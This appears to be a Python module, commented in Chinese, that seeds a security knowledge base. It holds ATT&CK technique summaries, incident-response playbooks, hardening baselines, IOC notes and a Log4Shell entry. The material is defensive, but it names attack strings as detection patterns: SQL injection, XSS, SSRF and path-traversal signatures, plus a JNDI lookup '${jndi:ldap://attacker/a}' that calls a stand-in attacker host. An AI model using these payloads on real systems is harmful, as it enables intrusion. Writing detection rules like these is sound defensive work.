"""
知识库播种器 — 预置安全知识

首次运行时自动导入全面的安全知识覆盖:
  - MITRE ATT&CK 攻击技术（14个常见技术）
  - 应急响应 Playbook（6个场景）
  - 安全配置最佳实践
  - 日志分析模式与 IOC 指标
  - 漏洞分类与处置指南
"""
import asyncio
import json
import logging
from datetime import datetime, timezone

from sqlalchemy import func, select, text
from sqlalchemy.ext.asyncio import AsyncSession

from .knowledge_base import kb_manager
from .chunker import security_chunker

logger = logging.getLogger(__name__)


SEED_KNOWLEDGE = [
    # ════════════════════════════════════════════
    # MITRE ATT&CK 攻击技术（14项）
    # ════════════════════════════════════════════
    {
        "title": "C2 通信 (T1071)",
        "content": """C2 通信是指攻击者与被控主机之间的命令与控制信道。
常见协议: HTTP/HTTPS、DNS、ICMP、WebSocket。
检测要点:
1. 定期向固定 IP/域名发起 HTTP/HTTPS 请求
2. Beacon 间隔固定，流量模式规律
3. DNS 查询异常：TXT记录长度异常、查询频率异常
4. JA3/S 指纹与正常流量不一致
5. User-Agent 异常或与操作系统不匹配
6. HTTP Header 顺序异常或包含自定义字段
缓解措施:
1. 在网络边界封禁已知 C2 IP/域名
2. 对出站流量进行深度包检测 (DPI)
3. 限制不必要的出站连接
4. 部署 DNS 隧道检测
5. 使用 EDR 检测异常进程网络行为
6. 实施出站流量基线分析""",
        "source": "mitre-attack",
        "threat_types": ["C2_BEACON"],
        "severity": "critical",
        "tags": ["c2", "command-control", "t1071", "beacon"],
    },
    {
        "title": "数据外泄 (T1048)",
        "content": """数据外泄是指攻击者将敏感数据从目标网络传输到外部。
常见方式: HTTP POST、FTP、SMTP、云存储 API、DNS隧道。
检测要点:
1. 出站流量突增，特别是非工作时间
2. 大量数据通过 HTTP POST/API 方式外传
3. 数据包大小异常，base64 编码特征
4. 连接外部不常见的 IP/域名
5. 高敏感度文件被批量访问
6. 数据库导出操作异常
7. 压缩工具（zip/rar/7z）被非正常使用
缓解措施:
1. DLP 策略监控敏感数据外传
2. 限制非必要的出站带宽
3. 对出站 HTTPS 进行解密检测
4. 端口基线异常告警
5. 数据分类分级 + 访问控制
6. USB/外设管控
7. 水印溯源技术""",
        "source": "mitre-attack",
        "threat_types": ["DATA_EXFIL"],
        "severity": "critical",
        "tags": ["exfiltration", "data-loss", "t1048"],
    },
    {
        "title": "暴力破解 (T1110)",
        "content": """暴力破解指攻击者通过尝试大量密码组合获取系统访问权限。
常见目标: SSH、RDP、VPN、Web 登录、数据库。
检测要点:
1. 单位时间内大量认证失败日志（5分钟内>20次）
2. 同一 IP 尝试多个用户名
3. 分布式暴力破解（多 IP 配合同一账户）
4. 非工作时间认证尝试突增
5. 成功登录紧随大量失败之后
6. 密码喷洒 (Password Spraying): 少量密码尝试大量账户
缓解措施:
1. 账户锁定策略（5次失败锁定15分钟）
2. 部署 WAF/IPS 限流
3. MFA 多因素认证
4. 封禁攻击来源 IP
5. 使用 Fail2ban 等自动阻断工具
6. 禁用默认账户和弱密码""",
        "source": "mitre-attack",
        "threat_types": ["BRUTE_FORCE"],
        "severity": "high",
        "tags": ["brute-force", "credential", "t1110", "password-spray"],
    },
    {
        "title": "端口扫描 (T1046)",
        "content": """端口扫描是攻击者探测目标开放服务的前置侦察行为。
常见工具: Nmap、Masscan、Zmap、RustScan。
检测要点:
1. 单个源 IP 短时间内连接大量端口
2. 连接未开放端口产生 RST 响应
3. SYN 包比例异常（只发 SYN 不收 SYN-ACK）
4. 按固定规律递增的目标端口号
5. 来自非常见扫描器 IP 段的流量
6. 多种探测方式组合（TCP SYN、TCP Connect、UDP）
缓解措施:
1. 端口扫描检测器联动防火墙自动封禁
2. 仅开放必要端口
3. 端口敲门机制
4. 部署 IPS/IDS 检测扫描行为
5. 限制同一源 IP 的连接速率""",
        "source": "mitre-attack",
        "threat_types": ["PORT_SCAN"],
        "severity": "medium",
        "tags": ["scanning", "recon", "t1046"],
    },
    {
        "title": "横向移动 (T1021)",
        "content": """横向移动指攻击者在被控网络内部扩展访问范围。
常见方式: SMB/WMI/WinRM/SSH、Pass-the-Hash、RDP跳转。
检测要点:
1. 管理端口（445/5985/22/3389）的非常规使用
2. 同一账户从多台主机登录（异常登录拓扑）
3. 非常用账户执行远程命令
4. 计划任务/服务创建事件
5. PsExec/SMBexec/WMIexec 等工具使用痕迹
6. Pass-the-Hash 特征（NTLM 登录而非 Kerberos）
缓解措施:
1. 网络分段 + 最小权限原则
2. 禁止使用内置管理员账号远程登录
3. 部署 EDR 监控横向移动行为
4. 强制使用 MFA
5. 监控敏感特权组变更""",
        "source": "mitre-attack",
        "threat_types": ["LATERAL_MOVE"],
        "severity": "high",
        "tags": ["lateral", "movement", "t1021", "pth"],
    },
    {
        "title": "DDoS 攻击 (T1498)",
        "content": """DDoS (分布式拒绝服务) 攻击通过大量流量耗尽目标资源。
常见类型:
1. Volumetric: UDP/ICMP 洪水、DNS 放大、NTP 放大
2. 协议攻击: SYN 洪水、ACK 洪水、TCP 连接耗尽
3. 应用层: HTTP GET/POST 洪水、Slowloris、CC 攻击
检测要点:
1. 入站流量突增至基线的 N 倍
2. 大量来源 IP 向同一目标发起请求
3. 连接数/每秒请求数 (RPS) 异常升高
4. 响应时间显著增加或服务不可用
5. 单 IP 连接数短时间内剧增
缓解措施:
1. 启用流量清洗 (Anti-DDoS)
2. CDN 分发 + WAF 防护
3. 限速策略 + 连接数限制
4. 黑洞路由 / BGP Flowspec
5. 源验证 (SYN Cookie、反向探测)""",
        "source": "mitre-attack",
        "threat_types": ["DDoS_TRAFFIC"],
        "severity": "high",
        "tags": ["ddos", "t1498", "amplification", "volumetric"],
    },
    {
        "title": "恶意软件执行 (T1204)",
        "content": """恶意软件执行指用户在本地运行恶意代码的过程。
常见传播: 钓鱼邮件附件、水坑攻击、社会工程、USB摆渡。
检测要点:
1. 非正常位置（%TEMP%、%APPDATA%）的可执行文件创建
2. 异常进程链（如 Office 启动 PowerShell/cmd）
3. 宏/脚本启用的 Office 文档
4. 注册表 Run/RunOnce 键值修改
5. 计划任务创建
6. 可疑的 DLL 侧加载
7. 进程注入行为
缓解措施:
1. 禁用 Office 宏（默认）
2. 应用程序白名单 (AppLocker)
3. 部署 EDR 实时监控
4. 邮件安全网关过滤
5. 用户安全培训
6. 攻击面减少 (ASR) 规则""",
        "source": "mitre-attack",
        "threat_types": ["MALWARE_DETECT"],
        "severity": "high",
        "tags": ["malware", "execution", "t1204", "phishing"],
    },
    {
        "title": "权限提升 (T1068)",
        "content": """权限提升指攻击者从低权限账户获取更高级别访问权限。
常见技术:
1. 内核漏洞利用 (Dirty Pipe/永恒之蓝)
2. 权限配置错误 (sudo、SUID)
3. 令牌窃取/模拟
4. 进程注入 (DLL注入、进程镂空)
5. 服务权限漏洞
检测要点:
1. SYSTEM/root 权限进程的异常创建
2. 权限令牌的可疑操作
3. 内核模块/驱动的加载
4. 服务配置修改
5. UAC 绕过检测
缓解措施:
1. 及时补丁管理
2. 最小权限原则
3. 移除不必要的提权能力
4. 监控高敏感系统调用
5. 容器化/沙箱运行""",
        "source": "mitre-attack",
        "threat_types": ["PRIVILEGE_ESCALATION"],
        "severity": "high",
        "tags": ["privilege", "escalation", "t1068", "uac-bypass"],
    },
    {
        "title": "持久化 (T1547)",
        "content": """持久化指攻击者在被控系统上维持访问权限的机制。
常见方式:
1. 注册表 Run/RunOnce 键
2. 启动文件夹 (Startup Folder)
3. 计划任务 (Scheduled Tasks)
4. 服务 (Services)
5. DLL 劫持
6. 登录脚本
7. 内核模块
检测要点:
1. 注册表自动启动项的新增/修改
2. 启动文件夹中新增的文件
3. 新建的或修改的计划任务
4. 新注册的服务
5. 浏览器辅助对象 (BHO) 等扩展
6. 异常的 WMI 事件订阅
缓解措施:
1. 监控启动项的变更
2. 使用 AutoRuns 等工具定期检查
3. 限制用户写入自动启动位置
4. EDR 的持久化行为监控""",
        "source": "mitre-attack",
        "threat_types": ["PERSISTENCE"],
        "severity": "medium",
        "tags": ["persistence", "t1547", "autoruns", "startup"],
    },
    {
        "title": "凭证窃取 (T1555)",
        "content": """凭证窃取指攻击者获取用户或系统凭据的技术。
常见方式:
1. LSASS 内存转储 (Mimikatz)
2. SAM 数据库提取
3. 浏览器密码读取
4. 键盘记录
5. 网络嗅探
检测要点:
1. LSASS 进程的异常访问（非 lsass.exe 打开 LSASS）
2. 调试权限提升
3. SAM 文件读取尝试
4. 浏览器数据库文件的异常读取
5. 键盘钩子安装
缓解措施:
1. 启用 Credential Guard
2. 限制调试权限
3. 最小化 LSASS 使用
4. 加密网络通信
5. 定期轮换凭证""",
        "source": "mitre-attack",
        "threat_types": ["CREDENTIAL_ACCESS"],
        "severity": "critical",
        "tags": ["credential", "theft", "t1555", "mimikatz", "lsass"],
    },
    {
        "title": "发现与侦察 (T1082)",
        "content": """系统信息发现是攻击者了解目标环境的技术。
常见命令:
1. systeminfo / ifconfig / ipconfig (系统信息)
2. whoami / net user / id (用户信息)
3. netstat -ano / ss -tuln (网络连接)
4. tasklist / ps -aux (进程列表)
检测要点:
1. 多条系统发现命令的短时间集中执行
2. 非管理员使用系统枚举工具
3. 域查询命令 (nltest / net group)
4. 异常的血缘关系（cmd whoami netstat）
5. 大量文件枚举操作
缓解措施:
1. 限制系统信息命令的执行
2. 启用命令行审计 (4688)
3. 部署 EDR 检测异常命令行序列
4. 行为基线 + 异常检测""",
        "source": "mitre-attack",
        "threat_types": ["DISCOVERY"],
        "severity": "low",
        "tags": ["discovery", "recon", "t1082", "enumeration"],
    },
    {
        "title": "防御绕过 (T1562)",
        "content": """防御绕过指攻击者规避安全检测的技术。
常见方式:
1. 禁用安全服务 (Windows Defender、EDR Agent)
2. 删除事件日志
3. 关闭审计策略
4. 代码混淆/打包
5. 执行白名单绕过 (Regsvr32、Mshta、PowerShell)
6. AMSI 绕过
检测要点:
1. 安全服务被停止/禁用
2. 事件日志被清除 (EventID 1102/1105)
3. 防火墙规则被修改/删除
4. PowerShell 执行策略的修改
5. 注册表中安全配置项的变更
缓解措施:
1. 安全服务/EDR 采用自我保护 (Tamper Protection)
2. 日志集中转发（无法在本地删除）
3. 监控安全配置变更
4. 限制脚本执行策略""",
        "source": "mitre-attack",
        "threat_types": ["DEFENSE_EVASION"],
        "severity": "high",
        "tags": ["defense-evasion", "t1562", "amsi-bypass", "log-clearing"],
    },
    {
        "title": "Web 应用攻击 (T1190)",
        "content": """Web 应用攻击利用 Web 应用漏洞获取未授权访问。
常见漏洞: SQL注入、XSS、SSRF、RCE、文件上传、反序列化。
检测要点（WAF规则）:
1. SQL注入: ' / OR 1=1 / UNION SELECT / sleep(
2. XSS: <script> / onerror= / alert( / <img src=x
3. SSRF: file:/// / 127.0.0.1 / metadata 内网地址
4. RCE: cmd.exe / powershell / exec(
5. 路径遍历: ../ / %2e%2e%2f
6. 文件上传: 非白名单后缀（.jsp/.war/.aspx）
缓解措施:
1. WAF + 动态规则
2. 输入验证 + 参数化查询
3. 最小特权原则
4. 定期安全扫描和渗透测试
5. 安全的开发生命周期 (SDL)""",
        "source": "mitre-attack",
        "threat_types": ["WEB_ATTACK"],
        "severity": "high",
        "tags": ["web", "t1190", "sqli", "xss", "rce", "waf"],
    },
    {
        "title": "供应链攻击 (T1195)",
        "content": """供应链攻击指攻击者在软件/硬件的开发或分发过程中植入恶意。
案例: SolarWinds、Log4j、CodeCov、XZ后门。
攻击方式:
1. 篡改开源库（typ squatting / 恶意npm包）
2. CI/CD 管道投毒
3. 更新服务器劫持
4. 硬件/固件植入
检测要点:
1. 软件哈希值与官方公布不一致
2. 异常的出站连接（来自编译过程或更新程序）
3. 构建环境中出现未预期的文件修改
4. 依赖库版本异常跳变
缓解措施:
1. 软件物料清单 (SBOM) 管理
2. 依赖库版本锁定 + 签名验证
3. CI/CD 环境安全加固
4. 代码签名 + 完整性校验
5. 定期安全审计第三方组件""",
        "source": "mitre-attack",
        "threat_types": ["SUPPLY_CHAIN"],
        "severity": "critical",
        "tags": ["supply-chain", "t1195", "sbom", "dependency"],
    },
    # ════════════════════════════════════════════
    # 应急响应 Playbook（8个场景）
    # ════════════════════════════════════════════
    {
        "title": "C2 回连应急响应 Playbook",
        "content": """## 步骤 1: 确认告警
检查告警内容的完整性，确认源IP、目标IP、协议、时间。

## 步骤 2: 立即阻断
1. 在防火墙上封禁源IP出站连接
2. 在防火墙上封禁目标C2服务器IP
3. 如有终端EDR，隔离受影响主机

## 步骤 3: 取证分析
1. 导出受影响主机最近24小时网络连接日志
2. 检查进程创建事件，定位恶意进程
3. 检查计划任务、服务、启动项
4. 导出内存快照

## 步骤 4: 清除
1. 终止恶意进程
2. 删除计划任务/服务
3. 清理启动项
4. 修改受影响账户密码

## 步骤 5: 恢复
1. 确认清除完成后恢复主机
2. 解除防火墙临时封禁
3. 持续监控24小时确认无复发

## 步骤 6: 总结
1. 撰写安全事件报告
2. 更新IoC库
3. 改进检测规则""",
        "source": "playbook",
        "threat_types": ["C2_BEACON", "MALWARE_DETECT"],
        "severity": "critical",
        "tags": ["playbook", "response", "c2", "incident-response"],
    },
    {
        "title": "数据外泄应急响应 Playbook",
        "content": """## 步骤 1: 确认
1. 确认告警类型和严重度
2. 确认外泄数据和目标
3. 确认影响范围（哪些主机/哪些数据）

## 步骤 2: 立即阻断
1. 立即封禁源IP出站
2. 隔离受影响主机（从网络断开）
3. 阻塞目标IP/域名
4. 通知安全团队

## 步骤 3: 取证
1. 保留受影响系统内存快照
2. 导出网络连接日志
3. 检查文件访问审计日志
4. 检查进程和网络连接

## 步骤 4: 评估损失
1. 确定泄漏数据类型和数量
2. 确定受影响用户/客户
3. 评估合规性影响（GDPR等）

## 步骤 5: 恢复
1. 清除恶意软件/后门
2. 修改所有受影响凭据
3. 修复安全漏洞
4. 加强DLP策略""",
        "source": "playbook",
        "threat_types": ["DATA_EXFIL"],
        "severity": "critical",
        "tags": ["playbook", "response", "exfiltration", "incident-response"],
    },
    {
        "title": "暴力破解应急响应 Playbook",
        "content": """## 步骤 1: 确认
1. 确认攻击源IP和攻击目标
2. 确认暴力破解是否成功（是否有成功登录）
3. 确认受影响账户列表

## 步骤 2: 阻断
1. 封禁攻击源IP（防火墙临时封禁30分钟）
2. 启用账户锁定策略（如未启用）
3. 强制受影响账户修改密码
4. 启用MFA

## 步骤 3: 分析
1. 导出认证日志
2. 确认是否有后续横向移动
3. 检查是否有其他同源攻击

## 步骤 4: 加固
1. 部署Fail2ban或类似工具
2. 启用登录通知
3. 定期审计账户权限
4. 禁止弱密码""",
        "source": "playbook",
        "threat_types": ["BRUTE_FORCE"],
        "severity": "high",
        "tags": ["playbook", "response", "brute-force"],
    },
    {
        "title": "勒索软件应急响应 Playbook",
        "content": """## 步骤 1: 立即隔离
1. 立即断开受影响主机的网络连接
2. 关闭所有远程访问服务
3. 停止所有数据库和文件服务

## 步骤 2: 取证
1. 保留加密文件样本
2. 收集勒索信息（勒索信、比特币地址、邮箱）
3. 导出进程和网络连接快照
4. 检查是否有备份被删除

## 步骤 3: 恢复
1. 从离线备份恢复数据
2. 在干净环境中重建系统
3. 更改所有密码
4. 重置API密钥和令牌

## 步骤 4: 加固
1. 修补被利用的漏洞
2. 增强终端防护
3. 实施 3-2-1 备份策略
4. 加强远程访问控制""",
        "source": "playbook",
        "threat_types": ["MALWARE_DETECT", "DATA_EXFIL"],
        "severity": "critical",
        "tags": ["playbook", "ransomware", "incident-response", "backup"],
    },
    {
        "title": "DDoS 应急响应 Playbook",
        "content": """## 步骤 1: 确认
1. 确认攻击类型（Volumetric/协议/应用层）
2. 确认攻击目标IP和端口
3. 确认影响范围（哪些服务不可用）

## 步骤 2: 缓解
1. 启用Anti-DDoS清洗中心
2. 调整WAF规则（CC防护、限速）
3. 黑洞路由 source IP
4. 扩容带宽或启用备用链路

## 步骤 3: 溯源
1. 分析攻击流量特征（源IP分布、攻击向量）
2. 提取攻击模式更新WAF规则
3. 联合上游ISP清洗

## 步骤 4: 恢复
1. 持续监控流量是否回归基线
2. 评估服务影响和损失
3. 更新DDoS防护策略""",
        "source": "playbook",
        "threat_types": ["DDoS_TRAFFIC"],
        "severity": "high",
        "tags": ["playbook", "ddos", "incident-response", "mitigation"],
    },
    {
        "title": "Web 攻击应急响应 Playbook",
        "content": """## 步骤 1: 确认
1. 确认攻击类型（SQL注入/XSS/SSRF/RCE）
2. 确认受影响URL和参数
3. 确认数据是否泄露

## 步骤 2: 阻断
1. WAF添加虚拟补丁规则
2. 临时下线受影响页面/API
3. 回滚至安全版本
4. 封禁攻击源IP

## 步骤 3: 取证
1. 导出Web服务器访问日志
2. 检查数据库查询日志
3. 确认是否有后门文件写入
4. 检查文件完整性

## 步骤 4: 修复
1. 修复漏洞代码
2. 增强输入验证和输出编码
3. 更新WAF规则
4. 安全测试验证修复""",
        "source": "playbook",
        "threat_types": ["WEB_ATTACK"],
        "severity": "high",
        "tags": ["playbook", "web", "incident-response", "waf"],
    },
    {
        "title": "横向移动应急响应 Playbook",
        "content": """## 步骤 1: 确认
1. 确认横向移动来源和跳板主机
2. 确认使用的协议（SMB/WMI/SSH/RDP）
3. 确认受影响账户

## 步骤 2: 阻断
1. 隔离已失陷主机
2. 禁用被盗用的账户
3. 重置相关凭据
4. 限制管理端口访问

## 步骤 3: 全面排查
1. 检查所有主机的登录日志
2. 搜索横向移动工具痕迹
3. 检查域控制器安全
4. 审计权限组变更

## 步骤 4: 加固
1. 实施网络微分段
2. 部署PAM权限管理
3. 启用LAPS管理本地管理员密码
4. 部署EDR全量覆盖""",
        "source": "playbook",
        "threat_types": ["LATERAL_MOVE"],
        "severity": "high",
        "tags": ["playbook", "lateral", "incident-response", "containment"],
    },
    {
        "title": "凭证失窃应急响应 Playbook",
        "content": """## 步骤 1: 确认
1. 确认失窃凭证类型（域账户/本地账户/服务账户）
2. 确认泄露时间和范围
3. 确认攻击者已访问的系统

## 步骤 2: 立即处置
1. 立即重置受影响账户密码
2. 吊销会话令牌/TGT
3. 账户强制登出
4. 禁用休眠账户

## 步骤 3: 全面审计
1. 检查所有使用该账户的登录记录
2. 检查敏感资源访问记录
3. 检查是否有新的凭据添加
4. 审计Kerberos TGS请求

## 步骤 4: 加固
1. 启用Credential Guard
2. 实施LAPS
3. 减少域管理员数量
4. 启用登录审计告警""",
        "source": "playbook",
        "threat_types": ["CREDENTIAL_ACCESS"],
        "severity": "critical",
        "tags": ["playbook", "credential", "incident-response", "pam"],
    },
    # ════════════════════════════════════════════
    # 安全配置最佳实践
    # ════════════════════════════════════════════
    {
        "title": "Windows 安全基线配置",
        "content": """Windows 服务器安全基线关键配置:

1. 账户策略
- 密码长度最小值 14位
- 密码最长使用期限 90天
- 账户锁定阈值 5次
- 账户锁定时间 15分钟

2. 审计策略
- 登录事件: 成功+失败
- 账户管理: 成功
- 对象访问: 失败
- 特权使用: 成功+失败
- 进程创建: 成功 (4688)

3. 安全选项
- 禁用 Guest 账户
- 限制匿名访问
- SMB 签名启用
- LLMNR 禁用
- UAC 启用 (级别 2)

4. 防火墙规则
- 默认入站拒绝
- 仅开放业务端口
- RDP 限制来源 IP
- WinRM 启用加密""",
        "source": "internal",
        "threat_types": ["ANY"],
        "severity": "info",
        "tags": ["baseline", "hardening", "windows", "security-config"],
    },
    {
        "title": "Linux 安全基线配置",
        "content": """Linux 服务器安全基线关键配置:

1. 账户策略
- /etc/login.defs: PASS_MAX_DAYS 90
- /etc/pam.d/common-password: 密码复杂度
- 禁用root远程SSH登录 (PermitRootLogin no)

2. SSH 加固
- 使用密钥认证而非密码
- 端口修改（非22）
- Protocol 2
- MaxAuthTries 3
- ClientAliveInterval 300

3. 系统加固
- 最小化安装
- 关闭无用服务
- 配置 SELinux/AppArmor
- 内核参数加固 (/etc/sysctl.conf)
- 文件权限审计

4. 日志审计
- rsyslog 远程转发
- auditd 规则配置
- 日志完整性保护
- 定时日志轮转""",
        "source": "internal",
        "threat_types": ["ANY"],
        "severity": "info",
        "tags": ["baseline", "hardening", "linux", "security-config"],
    },
    {
        "title": "网络安全基线配置",
        "content": """网络安全设备基线配置:

1. 防火墙规则
- 默认拒绝所有入站流量
- 仅放行业务所需端口
- 出站流量最小化原则
- 区域隔离（Trust/DMZ/Untrust）

2. IDS/IPS 策略
- 启用关键攻击签名
- 定期更新签名库
- 配置自定义规则
- 告警分级和响应

3. VPN 加固
- 使用强加密 (AES-256-GCM)
- 证书认证
- 分割隧道禁用
- MFA 强制

4. 网络监控
- NetFlow/sFlow 全流量采集
- DNS 日志分析
- TLS 证书监控
- 异常流量告警""",
        "source": "internal",
        "threat_types": ["ANY"],
        "severity": "info",
        "tags": ["network", "baseline", "firewall", "segmentation"],
    },
    {
        "title": "云安全最佳实践",
        "content": """云平台安全最佳实践:

1. IAM 权限管理
- 最小权限原则
- 使用角色而非长期密钥
- 定期轮换访问密钥（90天）
- 启用 CloudTrail/操作审计

2. 网络安全
- 安全组最小化开放
- VPC 网络隔离
- WAF + CDN 防护
- 启用 VPC 流日志

3. 数据安全
- 存储桶访问控制（禁止公开读写）
- 启用 KMS 加密
- 数据库SSL连接强制
- 备份加密存储

4. 监控告警
- CIS 基线合规检查
- 异常API调用检测
- 配置变更告警
- 成本异常监控""",
        "source": "internal",
        "threat_types": ["ANY"],
        "severity": "info",
        "tags": ["cloud", "aws", "azure", "security-config", "iam"],
    },
    # ════════════════════════════════════════════
    # 日志分析与 IOC 检测规则
    # ════════════════════════════════════════════
    {
        "title": "Windows 安全事件 ID 速查表",
        "content": """Windows 安全关键 Event ID:

登录事件:
- 4624: 登录成功
- 4625: 登录失败
- 4634: 注销
- 4648: 显式凭证登录 (RunAs)
- 4776: 凭证验证

账户事件:
- 4720: 创建用户
- 4722: 启用账户
- 4724: 重置密码
- 4728: 将成员添加到安全组
- 4732: 将成员添加到本地组
- 4756: 将成员添加到通用组

进程事件 (需开启 4688):
- 4688: 进程创建
- 4689: 进程终止

策略事件:
- 4719: 审计策略变更
- 4739: 域策略变更
- 4704: 分配用户权限

其他:
- 1102: 审计日志被清除
- 5156: 连接允许
- 5157: 连接拒绝
- 7045: 新服务安装""",
        "source": "internal",
        "threat_types": ["ANY"],
        "severity": "info",
        "tags": ["windows", "eventid", "log", "audit"],
    },
    {
        "title": "IOC 指标与检测模式",
        "content": """常见入侵指标 (IOC) 与检测模式:

网络层 IOC:
1. 已知恶意 IP/域名（威胁情报源）
2. 罕见的地理位置连接
3. 非标准端口上的标准协议
4. 定期出站连接的固定间隔
5. DNS TXT 记录过长（> 200字符）

主机层 IOC:
1. %TEMP% 目录下的可执行文件
2. 随机8位字母的进程名
3. Run/RunOnce 注册表项新增
4. 隐藏文件/属性
5. 非正常位置的服务 DLL

文件层 IOC:
1. PE 文件的异常区段名
2. 数字签名无效或过期
3. 文件创建时间和修改时间不符
4. 已知恶意文件哈希 (MD5/SHA256)
5. 宏启用的 Office 文档

行为层 IOC:
1. 非管理员使用 WMIC/PowerShell
2. 单账户多地同时登录
3. 大量 4625 失败登录
4. 非工作时间的大规模文件操作
5. 异常的血缘关系树""",
        "source": "internal",
        "threat_types": ["ANY"],
        "severity": "info",
        "tags": ["ioc", "detection", "indicators", "threat-intel"],
    },
    {
        "title": "网络流量异常检测规则",
        "content": """网络流量异常检测规则:

1. 出站连接异常
- 新建立的出站连接（过去7天未出现的目的IP）
- 非工作时间的大流量出站
- 连接到已知恶意 IP/域名
- 频繁 DNS 查询同一域名但不发起连接

2. 协议异常
- HTTP 请求 Header 顺序异常
- SSL/TLS 证书与 SNI 不匹配
- DNS TXT 记录响应过大
- DHCP 指纹异常

3. 时间异常
- 固定间隔的 beacon 通信（如每60秒）
- 同源 IP 的端口扫描（> 20端口/10秒）
- 非工作时间的批量登录尝试

4. 流量特征
- JA3/S 指纹匹配已知恶意工具
- User-Agent 与操作系统不匹配
- HTTP POST 请求体含 base64 编码
- 出站流量比例突增（Upload > Download）""",
        "source": "internal",
        "threat_types": ["ANY"],
        "severity": "info",
        "tags": ["network", "detection", "anomaly", "traffic-analysis"],
    },
    # ════════════════════════════════════════════
    # 漏洞分类与处置指南
    # ════════════════════════════════════════════
    {
        "title": "Log4Shell (CVE-2021-44228)",
        "content": """CVE-2021-44228（Log4Shell / Apache Log4j2）是可远程利用的 JNDI 注入漏洞。
攻击者在日志字段中写入 ${jndi:ldap://attacker/a}，受害 Java 进程向恶意 LDAP 发起请求并加载远程类，导致 RCE。
别名: Log4Shell、Log4j RCE、CVE-2021-44228、CVE-2021-45046。
检测要点:
1. HTTP Header / User-Agent / URI 含 ${jndi:ldap 或 ${jndi:rmi
2. 出站 LDAP/RMI 连接到非常用端口
3. Java 进程突然拉起 shell / curl / wget
4. 日志中出现 jndi:ldap:// 或 log4j2 报错后的异常子进程
缓解:
1. 升级 log4j-core 到 2.17.1+（CVE-2021-44228 / 45046 修复）
2. 设置 log4j2.formatMsgNoLookups=true
3. 边界拦截 jndi:ldap 特征
4. 限制应用服务器出站 LDAP
相关 ATT&CK: T1190 面向公网应用利用, T1059 命令执行。""",
        "source": "cve",
        "threat_types": ["WEB_ATTACK"],
        "severity": "critical",
        "tags": ["cve-2021-44228", "log4shell", "log4j", "jndi", "rce"],
    },
    {
        "title": "漏洞严重度分级与处置时效",
        "content": """漏洞严重度分级与处置时效:

CVSS 9.0-10.0 (Critical):
- 可远程利用且导致完全失陷
- 处置: 48小时内修复
- 例: Log4Shell、EternalBlue、ProxyShell

CVSS 7.0-8.9 (High):
- 可导致信息泄露或权限提升
- 处置: 7天内修复
- 例: 常见 RCE、SQL注入、SSRF

CVSS 4.0-6.9 (Medium):
- 需要特定条件的漏洞
- 处置: 30天内修复
- 例: XSS、目录遍历、CSRF

CVSS 0.1-3.9 (Low):
- 影响有限的漏洞
- 处置: 90天内修复或记录跟踪
- 例: 信息泄露、Vulnerability scanners

临时缓解措施（针对Critical）:
1. 虚拟补丁 (WAF/IPS)
2. 修改配置缓解风险
3. 启用额外访问控制
4. 临时下线受影响服务""",
        "source": "internal",
        "threat_types": ["ANY"],
        "severity": "info",
        "tags": ["vulnerability", "cvss", "patch-management", "severity"],
    },
    {
        "title": "安全事件分级响应原则",
        "content": """安全事件严重度分级与响应原则:

CRITICAL (严重):
- 数据外泄、C2回连、勒索软件、横向移动
- 响应: 立即阻断,隔离主机,通知安全团队

HIGH (高危):
- 暴力破解(确认为攻击)、恶意软件、DDoS
- 响应: 自动封禁IP,限速,告警通知,1小时内人工介入

MEDIUM (中危):
- 端口扫描、登录异常、低频恶意软件
- 响应: 限速,观察,24小时内分析

LOW (低危):
- 单次扫描探测、DNS查询异常、信息事件
- 响应: 记录,周期性分析

INFO (信息):
- 正常行为日志
- 响应: 存档备查""",
        "source": "internal",
        "threat_types": ["ANY"],
        "severity": "info",
        "tags": ["severity", "classification", "policy", "sla"],
    },
]


async def seed_knowledge_base(session: AsyncSession):
    """预置安全知识到知识库"""
    from models import KnowledgeChunk

    count = (await session.execute(
        select(func.count(KnowledgeChunk.id))
    )).scalar() or 0

    if count > 10:
        logger.info(f"Knowledge base already seeded ({count} chunks), ensuring CVE seeds")
        await _ensure_missing_seed_docs(session)
        return

    logger.info(f"Seeding knowledge base with {len(SEED_KNOWLEDGE)} documents...")

    total_chunks = 0
    for doc_data in SEED_KNOWLEDGE:
        doc = await kb_manager.add_document(
            session=session,
            title=doc_data["title"],
            content=doc_data["content"],
            source=doc_data["source"],
            threat_types=doc_data["threat_types"],
            severity=doc_data["severity"],
            tags=doc_data["tags"],
        )
        doc_id = doc["id"]

        chunks = security_chunker.chunk_document(
            doc_id=doc_id,
            title=doc_data["title"],
            content=doc_data["content"],
            source=doc_data["source"],
            threat_types=doc_data["threat_types"],
            severity=doc_data["severity"],
            tags=doc_data["tags"],
        )

        from rag.lexical import build_search_lex
        for chunk_data in chunks:
            chunk = KnowledgeChunk(
                doc_id=chunk_data["doc_id"],
                chunk_id=chunk_data["chunk_id"],
                content=chunk_data["content"],
                title=doc_data["title"],
                source=doc_data["source"],
                threat_types=doc_data["threat_types"],
                severity=doc_data["severity"],
                tags=doc_data["tags"],
                embedding=None,  # 占位不由这里写入(None → 由 seed 后受管回填按实际维度算)
                token_count=chunk_data["token_count"],
                search_lex=build_search_lex(
                    doc_data["title"], chunk_data["content"], doc_data["threat_types"],
                ),
            )
            session.add(chunk)
            total_chunks += 1

    await session.commit()
    logger.info(f"Knowledge base seeded: {len(SEED_KNOWLEDGE)} documents, {total_chunks} chunks")


async def _ensure_missing_seed_docs(session: AsyncSession):
    """已播种库补插 CVE 等后加文档（不依赖整库重置）。"""
    from models import KnowledgeDoc, KnowledgeChunk
    from rag.lexical import build_search_lex

    for doc_data in SEED_KNOWLEDGE:
        title = doc_data.get("title") or ""
        if "CVE-" not in title:
            continue
        exists = (await session.execute(
            select(KnowledgeDoc.id).where(KnowledgeDoc.title == title)
        )).scalar()
        if exists:
            continue
        doc = await kb_manager.add_document(
            session=session,
            title=title,
            content=doc_data["content"],
            source=doc_data["source"],
            threat_types=doc_data["threat_types"],
            severity=doc_data["severity"],
            tags=doc_data["tags"],
        )
        chunks = security_chunker.chunk_document(
            doc_id=doc["id"],
            title=title,
            content=doc_data["content"],
            source=doc_data["source"],
            threat_types=doc_data["threat_types"],
            severity=doc_data["severity"],
            tags=doc_data["tags"],
        )
        for chunk_data in chunks:
            session.add(KnowledgeChunk(
                doc_id=chunk_data["doc_id"],
                chunk_id=chunk_data["chunk_id"],
                content=chunk_data["content"],
                title=title,
                source=doc_data["source"],
                threat_types=doc_data["threat_types"],
                severity=doc_data["severity"],
                tags=doc_data["tags"],
                embedding=None,
                token_count=chunk_data["token_count"],
                search_lex=build_search_lex(title, chunk_data["content"], doc_data["threat_types"]),
            ))
        await session.commit()
        logger.info(f"Seeded missing CVE doc: {title}")

